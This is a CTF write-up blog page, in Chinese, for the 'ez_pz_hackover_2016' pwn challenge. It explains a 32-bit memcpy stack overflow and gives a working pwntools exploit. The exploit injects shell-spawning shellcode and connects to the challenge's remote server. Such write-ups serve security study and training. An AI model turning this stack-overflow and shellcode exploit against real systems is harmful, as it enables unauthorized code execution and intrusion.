@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ez_pz_hackover_2016 保护基本都没有开，可以考虑shellcode。 查看字符串，没有发现&#x2F;bin&#x2F;sh 使用ida查看重要代码 12345678910111213141516171819202122232425262728293031323334353637383940int __cdecl main(int argc, const char **argv,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ez_pz_hackover_2016">
+<meta property="og:url" content="http://example.com/ez_pz_hackover_2016/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ez_pz_hackover_2016 保护基本都没有开，可以考虑shellcode。 查看字符串，没有发现&#x2F;bin&#x2F;sh 使用ida查看重要代码 12345678910111213141516171819202122232425262728293031323334353637383940int __cdecl main(int argc, const char **argv,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/ez_pz_hackover_2016/1.jpg">
+<meta property="og:image" content="http://example.com/ez_pz_hackover_2016/2.jpg">
+<meta property="og:image" content="http://example.com/ez_pz_hackover_2016/3.jpg">
+<meta property="og:image" content="http://example.com/ez_pz_hackover_2016/4.jpg">
+<meta property="article:published_time" content="2021-10-11T15:10:49.000Z">
+<meta property="article:modified_time" content="2022-07-19T01:48:56.301Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="32bit">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/ez_pz_hackover_2016/1.jpg">
+
+<link rel="canonical" href="http://example.com/ez_pz_hackover_2016/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ez_pz_hackover_2016 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/ez_pz_hackover_2016/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ez_pz_hackover_2016
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-11 23:10:49" itemprop="dateCreated datePublished" datetime="2021-10-11T23:10:49+08:00">2021-10-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:48:56" itemprop="dateModified" datetime="2022-07-19T09:48:56+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p><img src="/ez_pz_hackover_2016/1.jpg"></p>
+<p>保护基本都没有开，可以考虑shellcode。</p>
+<p>查看字符串，没有发现&#x2F;bin&#x2F;sh</p>
+<p>使用ida查看重要代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);    <span class="comment">//栈地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);                        <span class="comment">// 输入到s </span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);      </span><br><span class="line">  <span class="comment">//C 库函数 void *memchr(const void *str, int c, size_t n) 在参数 str 所指向的字符串的前 n 个字节中搜索第一次出现字符 c（一个无符号字符）的位置。   这里的10就是指换行符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v3 )         <span class="comment">//没有作用</span></span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = (<span class="type">void</span> *)<span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);    <span class="comment">//strcmp以0x00结尾，认为0x00就是字符串结束了，不会再对后面的继续做判断</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )       <span class="comment">//要求strcmp的比较结果为0，也就是相等</span></span><br><span class="line">    result = vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);    <span class="comment">//调用vuln，限制的长度为0x400</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);              <span class="comment">// 可以溢出，memcpy不是以0x00结尾的，而是看n的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路：可以构造一个shellcode，然后通过输入s写到栈上，在vuln的溢出时把ret地址覆盖，返回到shellcode的起始地址。</p>
+<p>要成功执行我们的shellcode必须要知道shellcode的位置，而chall函数在执行时就把s缓冲区的地址告诉了我们，因此，只要知道了s缓冲区和shellcode地址的相对偏移量，那么我们每次都可以得到shellcode的地址<br>那通过脚本调试先确定好执行到覆盖栈的偏移量</p>
+<p>测试payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line">      <span class="comment">#利用它找到返回地址在栈上的地址，将返回地址覆盖为shellcode</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()<span class="comment">#linxu下的暂停程序命令</span></span><br></pre></td></tr></table></figure>
+
+<p>断点0x8048600就是在memcpy复制完之后，这样就能知道溢出的长度为多少</p>
+<p><img src="/ez_pz_hackover_2016/2.jpg"></p>
+<p>经过调试，可以知道，溢出的长度为18.</p>
+<p><img src="/ez_pz_hackover_2016/3.jpg"></p>
+<p>需要让程序返回到shellcode的起始地址，则需要对地址进行计算，对构造的payload进行理解</p>
+<p>‘crashme\x00’+’aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa’</p>
+<p>这是我们在测试时候构造的payload，其中让他转会为shellcode</p>
+<p>‘crashme\x00后的18个字母是填充字母，无所谓（包含了ebp了），其后的4个字母是ret地址，要填写shellcode地址。</p>
+<p>最后的部位填写shellcode，也就是从aaga的部分开始，我们一开始得到了一个地址，search ‘aaga’得到该字符串的栈地址，通过该地址计算偏移，得到0x1c。</p>
+<p><img src="/ez_pz_hackover_2016/4.jpg"></p>
+<p>因此最终的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,27872)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">#context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash&#x27;)</span><br><span class="line">p.recv(2)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">print(&#x27;stack_addr:&#x27; + hex(stack_addr))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = &#x27;crashme\x00&#x27; + &#x27;a&#x27;*18 + p32(stack_addr-0x1c) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/32bit/" rel="tag"># 32bit</a>
+              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/mrctf2020_shellcode%20/" rel="prev" title="mrctf2020_shellcode">
+      <i class="fa fa-chevron-left"></i> mrctf2020_shellcode
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" rel="next" title="pwn知识点整理">
+      pwn知识点整理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-pz-hackover-2016"><span class="nav-number">1.</span> <span class="nav-text">ez_pz_hackover_2016</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
